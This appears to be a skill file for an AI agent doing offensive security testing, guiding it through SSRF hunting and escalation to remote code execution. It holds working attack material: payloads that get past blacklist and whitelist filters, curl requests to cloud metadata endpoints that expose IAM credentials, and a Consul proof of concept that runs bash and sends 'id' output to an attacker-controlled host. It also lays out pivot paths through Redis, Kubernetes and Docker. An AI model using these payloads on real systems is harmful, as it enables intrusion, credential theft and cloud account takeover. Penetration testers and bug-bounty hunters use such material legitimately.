---
name: ssrf-testing
description: "SSRF hunting end to end — finding it where no URL parameter is obvious (partial URLs, URLs inside data formats, the Referer header), bypassing blacklist and whitelist filters via alternative IP encodings, authority confusion and open-redirect chaining, confirming blind SSRF out-of-band, then escalating to RCE by pivoting to Redis, Consul, Kubernetes, Docker, or cloud metadata. Use when any feature fetches a URL, imports or renders a supplied file, or when a Medium-rated SSRF needs to become a Critical."
---

# SSRF → Internal Pivot → RCE

## Crown Jewel Targets

- **Redis (port 6379)** — write cron job or authorized_keys via SSRF for full RCE
- **HashiCorp Consul (port 8500)** — register service with exec check for command execution
- **Kubernetes API (port 8080/6443)** — create privileged pod for cluster-level RCE
- **AWS IAM credentials** via metadata endpoint leading to cloud account takeover
- **Docker API (port 2375)** — create container with host mount for host-level RCE
- **Elasticsearch (port 9200)** — read/write indices, potential script execution
- **Internal Jenkins (port 8080)** — Groovy script console for arbitrary command execution

## Attack Surface Signals

- Any parameter accepting URLs: `url=`, `uri=`, `path=`, `src=`, `href=`, `dest=`, `redirect=`
- DNS callback received on interactsh/Burp Collaborator from target server IP
- Error messages revealing internal hostnames (`*.internal`, `*.corp`, `*.local`)
- Response time differences between open/closed internal ports
- Webhook configuration features, URL preview/unfurl, image proxy endpoints
- PDF generators, file import from URL, RSS feed parsers

## Detection
```bash
# Find URL-accepting parameters
grep -E "url=|uri=|path=|src=|href=|dest=|redirect=" <(curl -s TARGET)
# Test with an OOB callback. Mint the host first with
# mcp__Burp__generate_collaborator_payload (or oob_new), then poll it with
# mcp__Burp__get_collaborator_interactions (or oob_check). There is no
# interactsh-client in this image.
curl -s "TARGET/endpoint?url=https://PAYLOAD_HOST"
# Test cloud metadata
curl -s "TARGET/endpoint?url=http://169.254.169.254/latest/meta-data/"
curl -s "TARGET/endpoint?url=http://metadata.google.internal/"
```

**Positive indicators:**
- DNS callback received on interactsh from target server
- Cloud metadata content returned in response body
- Internal network hosts reachable (localhost, 10.x, 172.16.x, 192.168.x)
- Error messages revealing internal IP addresses or hostnames

## Finding SSRF where there is no obvious URL parameter

Most SSRF is not a parameter named `url`. Three surfaces produce the majority of missed cases:

**Partial URLs in requests** — the app supplies scheme and host and you control only a fragment (a hostname component, a path segment, a port). Injecting a full URL fails, so try relative escapes and authority confusion: `//attacker.example`, `@attacker.example`, or a path that traverses out of the intended prefix.

**URLs inside data formats** — a parser that follows references is an SSRF engine. XML is the standard case (external entities — see `xxe-testing`), but the same applies to any format the backend expands: SVG, DOCX/XLSX, PDF generators fetching remote resources, YAML include directives, JSON-LD `@context`, and webhook/callback fields in JSON bodies. If a feature imports, converts, previews, or renders a file you supply, treat it as an SSRF candidate even with no URL field in sight.

**The Referer header** — analytics and link-preview components often fetch the referring URL server-side. Point `Referer` at your collaborator host and watch for a hit. One request per endpoint, and almost never tested.

## Filter bypass

**Blacklist-based filters** (blocking `127.0.0.1`, `localhost`):
```
http://127.1/              http://0/                http://0177.0.0.1/   (octal)
http://2130706433/         (decimal)                http://[::1]/        (IPv6)
http://127.0.0.1.nip.io/   (DNS resolving to loopback)
http://LOCALHOST/          (case variation, where the filter is case-sensitive)
```
Also try double URL encoding, and registering a hostname whose DNS record points at the internal address.

**Whitelist-based filters** (requiring an approved host in the URL) — abuse parser ambiguity so the *validator* and the *requester* disagree about the authority:
```
https://expected-host@attacker.example/       credentials syntax
https://attacker.example#expected-host        fragment
https://expected-host.attacker.example/       suffix match
https://attacker.example/?x=expected-host     substring in the query
```
URL-encode the delimiter (`%23`, `%40`), and double-encode when a single layer is rejected.

**Open redirect chaining** — if the whitelist genuinely holds, find an open redirect on the permitted host and point the SSRF at it. The fetcher validates the allowed host, follows the 302, and lands wherever you chose. This is exactly why a "low severity" open redirect is worth keeping (`open-redirect`).

**Blind SSRF** — no response returns, so detection is out-of-band: point the target at an interactsh/Collaborator host and watch for DNS first, then HTTP. A DNS lookup with no following HTTP request usually means the request was made and the response discarded — still a confirmed vulnerability, and still enough for internal port scanning by timing.

## Exploitation
1. Confirm SSRF: interactsh DNS callback received
2. Probe internal network:
   - AWS metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
   - GCP metadata: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/`
   - Internal hosts: `http://localhost:PORT`, `http://10.0.0.1:PORT`
3. Scan common internal ports: 6379 (Redis), 8500 (Consul), 2375 (Docker), 9200 (Elasticsearch), 27017 (MongoDB)
4. Escalation paths:
   - Redis (port 6379): SSRF → write cron/authorized_keys → RCE
   - HashiCorp Consul (8500): SSRF → register service with exec → RCE
   - Kubernetes API (8080/6443): SSRF → create privileged pod → RCE
   - AWS metadata: SSRF → IAM credentials → cloud account takeover

## PoC Template
```bash
# Consul RCE chain
# 1. Confirm SSRF reaches Consul API
curl -s "VULNERABLE_ENDPOINT?url=http://localhost:8500/v1/agent/services"
# 2. Register malicious service with check
curl -s "VULNERABLE_ENDPOINT?url=http://localhost:8500/v1/agent/service/register" \
  --data '{"Name":"pwn","Check":{"Args":["bash","-c","curl ATTACKER/$(id)"],"Interval":"10s"}}'
# 3. Wait for callback → confirmed RCE
```

## Important Notes
- Not all SSRFs reach internal services — gopher:// and dict:// protocols extend attack surface
- SSRF via third-party open redirect: chain `redirect=https://ATTACKER` on third-party into SSRF
- `file://` protocol for LFI if input is not filtered
- DNS rebinding can bypass IP-based SSRF filters (resolve to internal IP on second lookup)

## Reference Writeups
- [SSRF to pivot internal network](https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf)
- [Pivoting from blind SSRF to RCE with HashiCorp Consul](http://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html)
- [How I Chained 4 vulnerabilities on GitHub Enterprise to RCE](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html) by Orange Tsai
- [ESEA SSRF and Querying AWS Meta Data](http://buer.haus/2016/04/18/esea-server-side-request-forgery-and-querying-aws-meta-data/) by Brett Buerhaus

---

## Operator Notes (Battle-Tested)

- **Port scan FIRST, exploit SECOND** — enumerate all localhost ports (6379, 8080, 8500, 2375, 9200, 27017) before attempting exploitation. One open port = entire chain
- **gopher:// is the ultimate SSRF primitive** — full TCP stream control. If accepted, you can speak any text-based protocol (Redis, SMTP, Memcached)
- **DNS rebinding bypasses IP filters** — set up domain alternating between attacker IP and 127.0.0.1 with 0 TTL. Filter passes on first lookup, SSRF hits localhost on second
- **AWS IMDSv2 requires PUT with token** — if target enforces IMDSv2, direct GET to metadata fails. Check for v1 fallback or use SSRF to issue PUT first
- **interactsh callback confirms SSRF before deep chain** — always start with DNS callback, then escalate
- **Report partial chains as HIGH** — even without RCE, SSRF + internal service interaction + data leak = HIGH severity. Don't wait for full RCE to report

## Related Skills & Chains

| Situation | Pattern / Skill |
|-----------|----------------|
| Need CRLF/protocol smuggling for Redis | `references/ssrf-protocol-smuggling-chain.md` |
| Blind SSRF, need full read | `references/ssrf-redirect-loop-exfil.md` |
| Next.js target | `references/nextjs-ssrf.md` |
| PDF generator as SSRF vector | `references/pdf-ssrf.md` |
| Found deserialization in cache layer | `deserialization-testing` |
| Finding discovered, check chain matrix | `auto-chain-discovery` |

## Reference files

Read these when the situation calls for the depth they carry — they are not loaded automatically.

- `references/nextjs-ssrf.md` — **nextjs ssrf** — related_patterns: [pdf-ssrf, ssrf-to-rce-chain, ssrf-redirect-loop-exfil, ssrf-protocol-smuggling-chain, origi
- `references/pdf-ssrf.md` — **pdf ssrf** — related_patterns: [ssrf-to-rce-chain, ssrf-redirect-loop-exfil, nextjs-ssrf, file-upload-techniques, lfi-path-
- `references/ssrf-protocol-smuggling-chain.md` — **ssrf protocol smuggling chain** — related_patterns: [ssrf-to-rce-chain, ssrf-redirect-loop-exfil, crlf-header-injection, deserialization-gadgets
- `references/ssrf-redirect-loop-exfil.md` — **ssrf redirect loop exfil** — related_patterns: [ssrf-to-rce-chain, ssrf-protocol-smuggling-chain, nextjs-ssrf, pdf-ssrf, open-redirect-chai
